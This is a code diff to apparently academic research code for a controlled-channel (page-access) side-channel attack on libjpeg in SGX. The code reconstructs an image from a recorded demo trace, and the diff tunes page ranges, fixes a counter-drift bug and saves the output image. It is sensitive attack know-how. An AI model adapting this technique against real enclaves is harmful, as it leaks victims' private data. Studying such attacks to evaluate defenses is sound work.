@@ -29,14 +29,22 @@ OUTPUT_IMAGE = "output/jpeg_reconstruction_navigator.pgm"
 
 
 def build_default_config() -> JpegAttackConfig:
-    """Return the page ranges tuned for the bundled libjpeg demo trace."""
+    """Return the page ranges tuned for the bundled libjpeg demo trace.
+
+    Identical to the config in jpeg_attack_reconstruction.py so the two
+    execution modes (one-shot and interactive navigator) produce
+    bit-equivalent reconstructions on the same trace. The DATA_COUNT
+    range mirrors the TLBlur-SGX Rust reference. See EVALUATION.md §13.
+    """
     return JpegAttackConfig(
         start_range=range(54, 55),
         next_row_range=range(44, 45),
         start_row_range=range(58, 59),
         pre_idct_slow_range=range(56, 57),
         idct_slow_range=range(62, 64),
-        data_count_range_no_aexnotify=range(154, 157),
+        data_count_range_no_aexnotify=range(150, 4340),
+        data_count_range_aexnotify=range(150, 4335),
+        data_count_pages=None,
         num_colors=1,
         aexnotify=False,
     )
@@ -77,7 +85,16 @@ def run_jpeg_attack_with_navigator(trace_path: str = TRACE_PATH) -> JpegAttackRe
 
         if previous_state == JpegState.IDCT_SLOW and new_state == JpegState.DATA_COUNT:
             data_counter = 1
-        elif previous_state == JpegState.DATA_COUNT and new_state == JpegState.DATA_COUNT:
+        elif (
+            previous_state == JpegState.DATA_COUNT
+            and new_state == JpegState.DATA_COUNT
+            and config.page_matches_state(JpegState.DATA_COUNT, page_number)
+        ):
+            # Only increment when the page actually matched DATA_COUNT.
+            # Without this guard, breakpoints on non-data-count pages
+            # (e.g. page 54 from start_range, hit while in DATA_COUNT) would
+            # falsely increment the counter. See EVALUATION.md §13 for the
+            # original symptom (navigator vs one-shot drift).
             data_counter += 1
 
         reconstruction.reconstruct_transition(previous_state, new_state, data_counter)
@@ -101,7 +118,8 @@ def run_jpeg_attack_with_navigator(trace_path: str = TRACE_PATH) -> JpegAttackRe
         processed_pages=processed_pages,
     )
 
-    # Also save a PNG preview for easy viewing
+    # Save the PGM (the named output) and a PNG preview for easy viewing.
+    attack_result.reconstruction.save_pgm(OUTPUT_IMAGE)
     OUTPUT_PNG = "output/jpeg_reconstruction_navigator.png"
     try:
         attack_result.reconstruction.save_png_preview(OUTPUT_PNG, scale=16)
